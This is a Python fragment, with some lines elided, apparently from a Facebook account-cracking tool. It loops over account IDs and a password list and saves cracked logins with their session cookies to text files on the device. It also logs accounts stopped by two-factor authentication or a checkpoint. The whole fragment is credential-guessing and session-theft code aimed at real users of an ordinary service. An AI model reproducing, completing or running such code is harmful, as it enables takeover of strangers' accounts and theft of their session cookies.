...
def __M1X__(self, ids, names, passlist):
    try:
        ...
        sys.stdout.write(
            f'\r{xp}{W}-{R}<[{W}NOX{R}-{W}{R}]>{W}-{R}<[{color}{self.loop}{R}/{W}M1{R}]>'
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                ...
                open('/sdcard/PS-/FILE/NOX-M1-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                self.oks.append(ids)
                break

            if twf in str(po):
                if 'y' in self.__CP__:
                    print(f'\r{xp}{W}-{R}<{W}[{R}NOX-2F{W}]{R}> {R}' + ids + f'/' + pas + '\033[1;97m')

                open('/sdcard/PS-/FILE/NOX-M1-2F.txt', 'a').write(ids + '/' + pas + '\n')
                self.twf.append(ids)
                break
            ...
            if 'www.facebook.com' in po.get('error', {}).get('message', ''):
                ...
                open('/sdcard/PS-/FILE/NOX-M1-CP.txt', 'a').write(ids + '/' + pas + '\n')
                self.cps.append(ids)
                break
            else:
                continue
